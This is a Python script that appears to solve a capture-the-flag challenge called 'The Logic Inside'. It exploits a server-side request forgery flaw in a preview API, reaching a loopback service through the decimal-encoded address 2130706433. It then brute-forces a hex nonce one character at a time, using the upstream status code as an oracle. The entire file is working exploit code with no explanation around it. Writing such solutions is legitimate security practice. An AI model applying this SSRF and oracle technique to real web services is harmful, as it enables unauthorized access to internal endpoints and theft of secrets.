#!/usr/bin/env python3
"""Recover Logic Inside's nonce through its SSRF status oracle."""

import sys
import requests


def recover(session_cookie: str) -> str:
    endpoint = (
        "https://pointeroverflowctf.com/challenges/the-logic-inside/"
        "_app/api/preview"
    )
    client = requests.Session()
    client.headers.update({"Cookie": f"session={session_cookie}"})
    alphabet = "0123456789abcdef"
    prefix = ""
    for _ in range(16):
        for char in alphabet:
            url = f"http://2130706433:9001/flag?guess={prefix}{char}"
            response = client.post(endpoint, json={"url": url}, timeout=10)
            response.raise_for_status()
            if response.json().get("upstream_status") == 200:
                prefix += char
                break
        else:
            raise RuntimeError(f"no matching character for prefix {prefix!r}")
    return prefix


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit(f"usage: {sys.argv[0]} POCTF_SESSION")
    print(recover(sys.argv[1]))
